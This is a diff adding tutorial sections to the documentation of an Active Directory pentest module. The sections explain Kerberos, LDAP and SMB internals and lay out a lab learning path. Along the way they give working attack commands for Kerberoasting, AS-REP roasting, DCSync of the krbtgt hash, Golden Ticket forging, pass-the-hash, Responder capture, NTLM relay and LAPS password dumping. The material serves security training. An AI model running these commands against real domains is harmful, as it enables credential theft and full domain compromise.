@@ -605,6 +605,14 @@ footer { border-top: 1px solid var(--border); margin-top: 2rem; }
         <li><a href="#params">Parameters</a></li>
         <li><a href="#examples">Examples</a></li>
         <li><a href="#requirements">Requirements</a></li>
+        <li><div class="sidebar-sep">Internals</div></li>
+        <li><a href="#ad-arch">AD Architecture</a></li>
+        <li><a href="#kerberos-bytes">Kerberos Bytes</a></li>
+        <li><a href="#ldap-internals">LDAP Internals</a></li>
+        <li><a href="#smb-internals">SMB Internals</a></li>
+        <li><a href="#ad-customization">Customization</a></li>
+        <li><div class="sidebar-sep">Study</div></li>
+        <li><a href="#ad-learning">Learning Path</a></li>
       </ul>
     </aside>
 
@@ -612,6 +620,50 @@ footer { border-top: 1px solid var(--border); margin-top: 2rem; }
     <div class="content">
 
       <!-- Overview -->
+            <!-- ═══════════════════════════════════════════════════════
+           BEGINNER STARTUP — read foundations.html first
+           ═══════════════════════════════════════════════════════ -->
+      <div id="beginner-startup" style="background:linear-gradient(135deg,#0d2018,#111a15);border:2px solid rgba(74,222,128,0.35);border-radius:12px;padding:1.6rem 2rem;margin-bottom:2.5rem">
+        <div style="display:flex;align-items:center;gap:0.8rem;margin-bottom:1rem">
+          <div style="width:32px;height:32px;background:#1a4a2e;border:1px solid rgba(74,222,128,0.4);border-radius:7px;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+          </div>
+          <div>
+            <div style="font-size:0.48rem;letter-spacing:0.22em;text-transform:uppercase;color:rgba(74,222,128,0.7)">Beginner Startup</div>
+            <div style="font-size:0.72rem;font-weight:700;color:#f0ede6">New to secV or windowsAD / winadsec? Start here.</div>
+          </div>
+          <a href="../foundations.html" style="margin-left:auto;font-size:0.52rem;color:#4ade80;text-decoration:none;border:1px solid rgba(74,222,128,0.35);padding:0.3rem 0.7rem;border-radius:5px;white-space:nowrap" onmouseover="this.style.background='rgba(74,222,128,0.1)'" onmouseout="this.style.background='transparent'">Foundations guide &rarr;</a>
+        </div>
+        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:0.8rem;margin-bottom:1.2rem">
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">What you need first</div>
+            <ul style="list-style:none;font-size:0.58rem;color:#666;line-height:1.9"><li>▸ Access to a Windows Active Directory domain (lab or authorized target)</li>
+<li>▸ <code>impacket</code>: <code>pip install impacket</code></li>
+<li>▸ <code>bloodhound</code>: <code>yay -S bloodhound</code></li>
+<li>▸ Valid domain credentials (even low-privilege user account)</li></ul>
+          </div>
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">Your first safe command</div>
+            <pre style="font-size:0.58rem;color:#9a9a9a;line-height:1.7;margin:0;white-space:pre-wrap">set dc 192.168.1.x
+set domain lab.local
+set user testuser
+set operation enum
+run</pre>
+          </div>
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">Operations by difficulty</div>
+            <ul style="list-style:none;font-size:0.58rem;color:#666;line-height:1.9">
+              <li><span style="color:#4ade80">&bull;</span> <strong style="color:#bbb">Easy:</strong> enum, user_list, share_enum</li>
+              <li><span style="color:#fbbf24">&bull;</span> <strong style="color:#bbb">Medium:</strong> kerberoast, asrep_roast, pass_spray</li>
+              <li><span style="color:#f87171">&bull;</span> <strong style="color:#bbb">Advanced:</strong> dcsync, golden_ticket, lateral_move</li>
+            </ul>
+          </div>
+        </div>
+        <div style="font-size:0.58rem;color:#555;border-top:1px solid rgba(255,255,255,0.06);padding-top:0.8rem">
+          <strong style="color:#888">Key terms:</strong> <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Active Directory (AD)</a> — Microsoft's directory service — manages users, computers, and policies in an org &nbsp;·&nbsp; <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Domain Controller (DC)</a> — The server that runs Active Directory &nbsp;·&nbsp; <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Kerberoasting</a> — Requesting service tickets for AD accounts, then cracking them offline &nbsp;·&nbsp; <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">DCSync</a> — Mimicking a Domain Controller to dump all password hashes
+          &nbsp;&mdash;&nbsp;<a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Full glossary &rarr;</a>
+        </div>
+      </div>
       <section id="overview">
         <p class="sec-label">Overview</p>
         <h2>What winadsec does</h2>
@@ -1367,6 +1419,445 @@ pip3 install donut-shellcode</code></pre>
           <span class="callout-mark">ℹ</span>
           The secV <code>install.sh</code> at the repo root handles all package installation automatically. Run it once after cloning to get all dependencies for your distro family.
         </div>
+      </section>
+
+      <!-- ══════════ AD ARCHITECTURE ══════════ -->
+      <section id="ad-arch">
+        <p class="sec-label">Internals</p>
+        <h2>Active Directory Architecture — From Zero</h2>
+        <p>
+          If you've never seen Active Directory before, start here. AD is Microsoft's directory service —
+          the centralized system that manages authentication, authorization, and user/computer accounts
+          across a Windows enterprise network.
+        </p>
+
+        <h3>What is Active Directory?</h3>
+        <p>
+          Imagine a company with 500 employees. Each employee needs a username and password to log into
+          their work computer. Without AD, each computer would have its own list of users — a nightmare
+          to manage. With AD, there's one central database: the <strong>Domain Controller (DC)</strong>.
+          Every computer in the company checks with the DC when someone logs in.
+        </p>
+        <pre><code><span class="comment">## Active Directory domain structure</span>
+
+           Domain: corp.local
+           ┌─────────────────────────────────────────────┐
+           │           Domain Controller (DC)             │
+           │                                             │
+           │  Active Directory Database (NTDS.dit)       │
+           │  ┌────────────────────────────────────┐     │
+           │  │ Objects:                           │     │
+           │  │  Users:    Alice, Bob, Admin       │     │
+           │  │  Groups:   Domain Admins, IT, HR   │     │
+           │  │  Computers: PC01, PC02, Server01   │     │
+           │  │  GPOs:     Password Policy, Firewall│    │
+           │  └────────────────────────────────────┘     │
+           │                                             │
+           │  Services: Kerberos KDC, DNS, LDAP          │
+           └─────────────────────────────────────────────┘
+                     ↑                    ↑
+              PC01 authenticates    Server01 gets policies
+              (checks credentials)  (from Group Policy)</code></pre>
+
+        <h3>Key Components Every Pentester Must Know</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Component</th><th>What It Is</th><th>Why Attackers Target It</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Domain Controller (DC)</strong></td><td>Windows Server running AD DS — stores the entire domain database</td><td>Owning the DC = owning the entire domain. All password hashes, all permissions live here.</td></tr>
+            <tr><td><strong>NTDS.dit</strong></td><td>The AD database file at <code>C:\Windows\NTDS\NTDS.dit</code></td><td>Contains password hashes for every user. DCSync attack extracts hashes without touching the file.</td></tr>
+            <tr><td><strong>Kerberos</strong></td><td>Authentication protocol used by AD</td><td>Multiple attack vectors: AS-REP Roasting, Kerberoasting, Pass-the-Ticket, Golden/Silver Ticket</td></tr>
+            <tr><td><strong>LDAP</strong></td><td>Protocol for querying the AD directory (port 389/636)</td><td>Anyone with domain credentials can query LDAP. Attackers enumerate users, groups, SPNs, ACLs.</td></tr>
+            <tr><td><strong>SMB</strong></td><td>File sharing protocol (port 445) — used for lateral movement</td><td>PsExec, WMI, admin shares — the main channels for moving between machines</td></tr>
+            <tr><td><strong>SYSVOL</strong></td><td>Shared folder on DC containing Group Policy scripts</td><td>Historically stored credentials in GPP XML files (now patched, but still found in legacy environments)</td></tr>
+            <tr><td><strong>LSASS</strong></td><td>Local Security Authority Subsystem — holds credentials in memory</td><td>Dumping LSASS gives NTLM hashes, Kerberos tickets, and sometimes plaintext passwords</td></tr>
+          </tbody>
+        </table>
+        </div>
+      </section>
+
+      <section id="kerberos-bytes">
+        <p class="sec-label">Internals</p>
+        <h2>Kerberos — From Zero to Golden Ticket</h2>
+        <p>
+          Kerberos is the authentication protocol Active Directory uses. Understanding it at the
+          protocol level is essential for exploiting Kerberoasting, AS-REP Roasting, and forging
+          Golden/Silver Tickets.
+        </p>
+
+        <h3>How Kerberos Works (Normal Authentication)</h3>
+        <pre><code><span class="comment">## Kerberos 3-party authentication — no password sent over network</span>
+
+Parties:
+  Client  = the user/machine authenticating
+  KDC     = Key Distribution Center (runs on the Domain Controller)
+  Service = the resource the user wants to access (e.g., a file share)
+
+<span class="comment">## Step 1: AS-REQ (Authentication Service Request)</span>
+Client → KDC:
+  "I'm Alice, I want a Ticket-Granting Ticket (TGT)"
+  Encrypted with: NTLM hash of Alice's password (client never sends the password!)
+
+<span class="comment">## Step 2: AS-REP (Authentication Service Response)</span>
+KDC → Client:
+  TGT (Ticket-Granting Ticket) encrypted with: krbtgt account's NTLM hash
+  Session key encrypted with: Alice's NTLM hash
+  <span class="comment"># Alice can decrypt the session key (she knows her password)</span>
+  <span class="comment"># Alice CANNOT decrypt the TGT (she doesn't know krbtgt's hash)</span>
+  <span class="comment"># The TGT proves "Alice authenticated at time T"</span>
+
+<span class="comment">## Step 3: TGS-REQ (Ticket-Granting Service Request)</span>
+Client → KDC:
+  "I have this TGT, I want to access CIFS/fileserver.corp.local"
+  Sends: TGT + service name (SPN)
+
+<span class="comment">## Step 4: TGS-REP (Ticket-Granting Service Response)</span>
+KDC → Client:
+  Service Ticket encrypted with: file server's computer account NTLM hash
+  <span class="comment"># Client CANNOT decrypt this — it's for the service to read</span>
+  <span class="comment"># THIS IS WHAT KERBEROASTING STEALS — encrypted with service account hash</span>
+
+<span class="comment">## Step 5: AP-REQ (Application Request)</span>
+Client → Service (file server):
+  Sends the service ticket
+  Service decrypts it with its own hash, verifies the client, grants access</code></pre>
+
+        <h3>AS-REP Roasting — No Credentials Needed</h3>
+        <pre><code><span class="comment">## AS-REP Roasting: exploit accounts with "Do not require Kerberos preauthentication"</span>
+<span class="comment">## Normally: AS-REQ includes an encrypted timestamp (proves you know the password)</span>
+<span class="comment">## With preauth disabled: KDC sends AS-REP to ANYONE who asks — no password needed!</span>
+
+<span class="comment">## What the KDC returns (AS-REP packet structure):</span>
+AS-REP {
+  pvno: 5                    <span class="comment"># Kerberos version 5</span>
+  msg-type: 11               <span class="comment"># AS-REP</span>
+  crealm: "CORP.LOCAL"
+  cname: "alice"
+  ticket: &lt;TGT encrypted with krbtgt hash — unusable without krbtgt hash&gt;
+  enc-part: {
+    etype: 18                <span class="comment"># AES256-CTS-HMAC-SHA1 or 23=RC4-HMAC</span>
+    cipher: &lt;session key + metadata encrypted with ALICE'S PASSWORD HASH&gt;
+  }
+}
+
+<span class="comment">## The enc-part cipher is encrypted with the user's hash</span>
+<span class="comment">## Attacker can request this without authentication</span>
+<span class="comment">## Then crack it offline with hashcat:</span>
+hashcat -m 18200 asrep_hash.txt rockyou.txt
+
+<span class="comment">## How windowsAD's adsec module detects this:</span>
+ldapsearch: find accounts with DONT_REQUIRE_PREAUTH flag set in userAccountControl
+  DONT_REQUIRE_PREAUTH = 0x400000 (bit 22 of userAccountControl)
+  ldapfilter: (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))</code></pre>
+
+        <h3>Kerberoasting — Cracking Service Account Passwords</h3>
+        <pre><code><span class="comment">## Kerberoasting: request service tickets for accounts with SPNs</span>
+<span class="comment">## Any domain user can request a TGS for any SPN — this is by design!</span>
+<span class="comment">## The TGS is encrypted with the service account's NTLM hash</span>
+<span class="comment">## If the service account has a weak password → crackable offline</span>
+
+<span class="comment">## Attack flow:</span>
+<span class="comment">## 1. Find all accounts with SPNs (Service Principal Names):</span>
+ldapfilter: (&(objectClass=user)(servicePrincipalName=*))
+  <span class="comment"># SPNs look like: MSSQLSvc/sqlserver01.corp.local:1433</span>
+  <span class="comment"># Any user account with an SPN is a service account</span>
+
+<span class="comment">## 2. Request TGS for each SPN (Kerberos protocol step 3-4 above)</span>
+GetUserSPNs.py corp.local/alice:password -request
+
+<span class="comment">## 3. Hash format for hashcat:</span>
+$krb5tgs$23$*sqlsvc$CORP.LOCAL$MSSQLSvc/sqlserver01*$&lt;hash&gt;
+
+<span class="comment">## 4. Crack:</span>
+hashcat -m 13100 tgs_hash.txt rockyou.txt -r best64.rule
+
+<span class="comment">## Why this works: service accounts often have passwords set once and never changed</span>
+<span class="comment">## They don't expire. Common passwords: Company2023!, ServiceAcc0unt!</span></code></pre>
+
+        <h3>Golden Ticket — Full Domain Compromise</h3>
+        <pre><code><span class="comment">## Golden Ticket: forge a TGT using the krbtgt account's NTLM hash</span>
+<span class="comment">## The krbtgt hash is used to encrypt ALL TGTs in the domain</span>
+<span class="comment">## If you have it, you can create TGTs for any user, with any privileges, valid for 10 years</span>
+
+<span class="comment">## Prerequisites: krbtgt NTLM hash (obtained by DCSync or NTDS.dit dump)</span>
+
+<span class="comment">## DCSync — replicate credentials without touching the DC disk:</span>
+python3 secretsdump.py -just-dc-user krbtgt corp.local/admin:'Password1'@dc01.corp.local
+<span class="comment"># Output: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE:::</span>
+
+<span class="comment">## Forge the Golden Ticket (using impacket's ticketer.py):</span>
+python3 ticketer.py \
+  -nthash &lt;krbtgt_ntlm_hash&gt; \
+  -domain-sid S-1-5-21-XXXX-XXXX-XXXX \
+  -domain corp.local \
+  -groups 512 \           <span class="comment"># 512 = Domain Admins group RID</span>
+  Administrator
+
+<span class="comment">## Result: golden_ticket.ccache — a valid Kerberos ticket for Administrator</span>
+<span class="comment">## Valid for 10 years. Persists even if Administrator's password changes.</span>
+<span class="comment">## Only invalidated by changing krbtgt's password TWICE (disrupts all sessions).</span>
+
+<span class="comment">## Use the ticket:</span>
+KRB5CCNAME=golden_ticket.ccache python3 psexec.py corp.local/Administrator@dc01.corp.local -k -no-pass
+<span class="comment">## You now have SYSTEM on the Domain Controller</span></code></pre>
+      </section>
+
+      <section id="ldap-internals">
+        <p class="sec-label">Internals</p>
+        <h2>LDAP — Querying the AD Directory</h2>
+        <p>
+          LDAP (Lightweight Directory Access Protocol) is how everything talks to Active Directory.
+          Understanding LDAP lets you enumerate the entire domain structure using only a regular
+          domain user account.
+        </p>
+        <pre><code><span class="comment">## LDAP query structure</span>
+protocol: ldap:// (port 389) or ldaps:// (port 636, TLS)
+base DN: DC=corp,DC=local    ← the root of the AD tree
+filter:  (objectClass=user)  ← what objects to find
+attrs:   sAMAccountName,memberOf  ← which fields to return
+
+<span class="comment">## Example: find all users with ldapsearch (CLI):</span>
+ldapsearch -H ldap://dc01.corp.local -D "alice@corp.local" -W \
+  -b "DC=corp,DC=local" \
+  "(objectClass=user)" \
+  sAMAccountName userAccountControl memberOf
+
+<span class="comment">## windowsAD module runs these queries with Python's ldap3 library</span>
+<span class="comment">## Key LDAP filters used internally:</span>
+
+<span class="comment"># All enabled users:</span>
+(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))
+
+<span class="comment"># Domain Admins members:</span>
+(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))
+
+<span class="comment"># All computer accounts:</span>
+(objectClass=computer)
+
+<span class="comment"># Accounts with SPN (Kerberoastable):</span>
+(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))
+
+<span class="comment"># Accounts without preauth (AS-REP Roastable):</span>
+(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))</code></pre>
+
+        <h3>BloodHound — Graph Attack Path Analysis</h3>
+        <pre><code><span class="comment">## BloodHound collects LDAP data and visualizes attack paths</span>
+<span class="comment">## windowsAD runs SharpHound (or python bloodhound) to collect the data</span>
+
+<span class="comment">## Collection — what data BloodHound gathers:</span>
+- All users, groups, computers, GPOs, OUs
+- Group memberships (who is in Domain Admins, who is in IT, etc.)
+- ACL edges (who has GenericAll, WriteDACL, DCSync rights on what)
+- Session data (who is logged into which computer right now)
+- Local admin rights (who has local admin on which machines)
+
+<span class="comment">## ACL attack paths (why ACLs matter):</span>
+Alice → GenericAll → Bob's account → Bob is Domain Admin
+<span class="comment"># If Alice has GenericAll over Bob, Alice can reset Bob's password</span>
+<span class="comment"># Then login as Bob → Domain Admin → DCSync → Golden Ticket</span>
+
+<span class="comment">## BloodHound query: find shortest path to Domain Admins from any user</span>
+MATCH (u:User),(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}),
+      p=shortestPath((u)-[*1..]->(g))
+RETURN p</code></pre>
+      </section>
+
+      <section id="smb-internals">
+        <p class="sec-label">Internals</p>
+        <h2>SMB — Lateral Movement Protocol</h2>
+        <p>
+          SMB (Server Message Block) is Windows's file sharing protocol and the main channel for
+          lateral movement in a Windows environment. It runs on port 445. Understanding its structure
+          explains why PsExec, WMI, and Pass-the-Hash work.
+        </p>
+        <pre><code><span class="comment">## SMB negotiation — what happens when you connect to port 445</span>
+
+1. TCP connect to target:445
+2. SMB negotiate protocol:
+   Client → Server: NEGOTIATE (lists supported SMB versions: SMB1/2/3)
+   Server → Client: NEGOTIATE response (selects version, encryption caps)
+
+3. Session setup (authentication):
+   Client → Server: SESSION_SETUP (NTLM or Kerberos authentication)
+   <span class="comment"># NTLM challenge-response: server sends 8-byte challenge</span>
+   <span class="comment"># client responds with NTLM_HASH(challenge + username + ...) — the Net-NTLMv2 hash</span>
+   <span class="comment"># THIS is what Responder captures — it's crackable offline</span>
+
+4. Tree connect:
+   Client → Server: TREE_CONNECT \\server\share
+   Server → Client: TREE_CONNECT response (share ID)
+
+5. File operations: CREATE, READ, WRITE, CLOSE
+
+<span class="comment">## Impacket PsExec — how it works over SMB</span>
+<span class="comment">## (windowsAD's shell operation uses this):</span>
+1. Authenticate to \\target\IPC$ (inter-process communication share)
+2. Create a unique service binary at \\target\ADMIN$ (C:\Windows\)
+3. Use DCE/RPC over SMB (pipe: \PIPE\svcctl) to start the service
+4. Service spawns cmd.exe with output redirected to a named pipe
+5. Client reads from the named pipe — this is your shell
+
+<span class="comment">## Pass-the-Hash — authenticate with NTLM hash (no password needed)</span>
+python3 psexec.py -hashes :NTLM_HASH corp.local/Administrator@target
+<span class="comment"># NTLM authentication accepts the hash directly — designed behavior</span>
+<span class="comment"># This is why NTLM hash = password for lateral movement purposes</span>
+
+<span class="comment">## NTLM hash format:</span>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE:::
+                  ↑ LM hash (empty/disabled)         ↑ NT hash (this is usable)</code></pre>
+
+        <h3>Responder — Capturing Net-NTLMv2 Hashes</h3>
+        <pre><code><span class="comment">## Responder poisons LLMNR/NBT-NS/mDNS — captures challenge-response hashes</span>
+
+<span class="comment">## LLMNR (Link-Local Multicast Name Resolution) — fallback DNS</span>
+<span class="comment">## When a Windows machine tries to resolve a hostname that DNS can't find:</span>
+<span class="comment">##   It broadcasts LLMNR/NBT-NS: "Anyone know where '\\fileserver' is?"</span>
+<span class="comment">##   Responder answers: "I am \\fileserver! Authenticate to me!"</span>
+<span class="comment">##   Victim authenticates → Responder captures the Net-NTLMv2 hash</span>
+
+<span class="comment">## Responder output example:</span>
+[SMB] NTLMv2-SSP Client   : 192.168.1.50
+[SMB] NTLMv2-SSP Username : CORP\alice
+[SMB] NTLMv2-SSP Hash     : alice::CORP:1122334455667788:HASH...
+
+<span class="comment">## Crack with hashcat:</span>
+hashcat -m 5600 ntlmv2_hash.txt rockyou.txt
+
+<span class="comment">## Or relay (no crack needed — works for local admins):</span>
+<span class="comment">## ntlmrelayx: relay the hash to another machine instead of cracking it</span>
+python3 ntlmrelayx.py -t smb://192.168.1.100 -smb2support
+<span class="comment">## If alice is local admin on 192.168.1.100: you get SYSTEM</span></code></pre>
+      </section>
+
+      <section id="ad-customization">
+        <p class="sec-label">Extend</p>
+        <h2>Customization &amp; Extension</h2>
+
+        <h3>Adding a Custom LDAP Query</h3>
+        <pre><code><span class="comment"># windowsAD.py — add to LDAP_QUERIES dict</span>
+LDAP_QUERIES = {
+    "users":        "(objectClass=user)",
+    "groups":       "(objectClass=group)",
+    "computers":    "(objectClass=computer)",
+    "spns":         "(&(objectClass=user)(servicePrincipalName=*))",
+    <span class="comment"># ── Add your custom query: ──</span>
+    "unconstrained": "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
+    <span class="comment"># 524288 = 0x80000 = TRUSTED_FOR_DELEGATION bit</span>
+    <span class="comment"># Accounts with unconstrained delegation can impersonate ANY user</span>
+    <span class="comment"># Printer Bug (SpoolSample) forces DC to authenticate → steal TGT</span>
+}
+
+<span class="comment"># Usage: set operation ldap_query; set query_name unconstrained</span></code></pre>
+
+        <h3>Writing a Custom Post-Exploitation Chain</h3>
+        <pre><code><span class="comment"># Add a "dump_laps" operation — extract LAPS passwords via LDAP</span>
+<span class="comment"># LAPS (Local Administrator Password Solution) stores local admin passwords in AD</span>
+<span class="comment"># Readable by delegated accounts — find who can read ms-Mcs-AdmPwd attribute</span>
+
+def _dump_laps_operation(self):
+    """Enumerate computers with LAPS and read passwords if permitted."""
+    self.log("[*] Querying LDAP for LAPS-managed computers...")
+
+    ldap_filter = "(&(objectClass=computer)(ms-Mcs-AdmPwd=*))"
+    attributes  = ["sAMAccountName", "ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime"]
+
+    results = self.ldap_search(ldap_filter, attributes)
+
+    for entry in results:
+        name = entry.get("sAMAccountName", "?")
+        pwd  = entry.get("ms-Mcs-AdmPwd", "&lt;no read access&gt;")
+        self.log(f"[+] {name}: {pwd}")
+        self.findings.append({
+            "type": "laps_password",
+            "computer": name,
+            "password": pwd,
+            "severity": "CRITICAL" if pwd != "&lt;no read access&gt;" else "INFO"
+        })</code></pre>
+      </section>
+
+      <section id="ad-learning">
+        <p class="sec-label">Study</p>
+        <h2>Learning Path &amp; Resources</h2>
+        <p>
+          Active Directory security is a deep field. Build your knowledge systematically — the payoff
+          is huge because AD is in almost every enterprise.
+        </p>
+
+        <h3>Step 1: Windows and AD Foundations</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Resource</th><th>Type</th><th>Why</th></tr></thead>
+          <tbody>
+            <tr><td>TryHackMe — "Active Directory Basics" room</td><td>Free</td><td>Visual intro to AD structure, DC, domains, forests, trusts. Complete before touching windowsAD module.</td></tr>
+            <tr><td>Microsoft Learn — Active Directory Domain Services</td><td>Free</td><td>Official Microsoft documentation. Understand how AD is meant to work before learning how to break it.</td></tr>
+            <tr><td>The Hacker Recipes (thehacker.recipes)</td><td>Free</td><td>Best free AD attack reference online. Covers every attack windowsAD implements with theory + commands. Use it alongside the module.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Step 2: Hands-On Labs</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Lab</th><th>Cost</th><th>Focus</th></tr></thead>
+          <tbody>
+            <tr><td>TryHackMe — "Attacktive Directory" room</td><td>Free</td><td>Guided lab: Kerberoasting, ASREPRoasting, credential reuse, DCSync. Run windowsAD alongside each step.</td></tr>
+            <tr><td>GOAD (Game of Active Directory) — github.com/Orange-Cyberdefense/GOAD</td><td>Free / self-hosted</td><td>The best free AD lab environment. Deploys a full vulnerable AD forest with multiple DCs. Use windowsAD against it for realistic practice.</td></tr>
+            <tr><td>HackTheBox — AD machines (Forest, Cascade, Monteverde, Sauna)</td><td>Free tier</td><td>Real AD exploitation chains. Each machine covers different attack paths. Start with Forest (AS-REP Roasting → DCSync).</td></tr>
+            <tr><td>VulnAD (github.com/WazeHell/vulnerable-AD)</td><td>Free</td><td>Single-script deployment of a vulnerable Windows AD lab. Faster setup than GOAD.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Step 3: Key Tools to Study</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Tool</th><th>Purpose</th><th>Learn At</th></tr></thead>
+          <tbody>
+            <tr><td>BloodHound (github.com/BloodHoundAD/BloodHound)</td><td>Graph-based AD attack path analysis — visually find the shortest path to Domain Admin</td><td>BloodHound wiki + TryHackMe "BloodHound" room</td></tr>
+            <tr><td>Impacket (github.com/fortra/impacket)</td><td>Python suite for SMB, Kerberos, LDAP attacks — windowsAD uses it internally</td><td>Impacket examples directory + CrackMapExec docs</td></tr>
+            <tr><td>CrackMapExec (github.com/mpgn/CrackMapExec)</td><td>Swiss army knife for AD lateral movement — spray credentials, execute commands over SMB/WMI</td><td>CME wiki — try each module against GOAD</td></tr>
+            <tr><td>Rubeus (github.com/GhostPack/Rubeus)</td><td>Windows-side Kerberos toolkit — Kerberoasting, ASREPRoasting, Pass-the-Ticket (for use after getting foothold)</td><td>Rubeus README + SpecterOps blog posts</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Step 4: Deep Learning</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Resource</th><th>Level</th><th>Best For</th></tr></thead>
+          <tbody>
+            <tr><td>TCM Security — Practical Active Directory course (free on YouTube)</td><td>Beginner</td><td>Full course covering every major AD attack. Run windowsAD alongside each section to automate what you learn manually.</td></tr>
+            <tr><td>SpecterOps Attack Research (specterops.io/blog)</td><td>Advanced</td><td>Original research behind many AD attacks: DCSync, Kerberoasting, ACL abuse, certificate abuse (ESC1-ESC8). Read the original papers.</td></tr>
+            <tr><td>Certified Red Team Professional (CRTP) — PentesterAcademy</td><td>Intermediate</td><td>The best AD red teaming certification. Course covers the full attack chain windowsAD implements.</td></tr>
+            <tr><td>The Cyber Mentor (TCM) — AD Pentesting course</td><td>Intermediate</td><td>Paid course with lab included. Covers real-world AD scenarios beyond the basics.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Practice Path</h3>
+        <pre><code><span class="comment">## Week-by-week AD pentesting skill build</span>
+
+Week 1: Lab Setup + Enumeration
+  Setup: GOAD or VulnAD in your lab (lab-setup.html)
+  Run: windowsAD assess operation — read every finding
+  Study: what each LDAP attribute means (thehacker.recipes/ad/enumeration)
+
+Week 2: Credential Attacks
+  Run: windowsAD kerberoast — try to crack the TGS hashes
+  Run: asreproast — find pre-auth disabled accounts
+  Manual: replicate with GetUserSPNs.py and GetNPUsers.py directly
+
+Week 3: Lateral Movement
+  Get a low-priv shell on any machine in GOAD
+  Run: windowsAD assess to enumerate from inside the domain
+  Use: BloodHound to find attack path to Domain Admin
+  Execute: the path manually + with windowsAD
+
+Week 4: Domain Dominance
+  Perform: DCSync to dump krbtgt hash
+  Forge: a Golden Ticket
+  Verify: you can access any machine in the domain with the ticket
+  Document: the full attack chain (this is your penetration test report)</code></pre>
       </section>
 
     </div><!-- /content -->
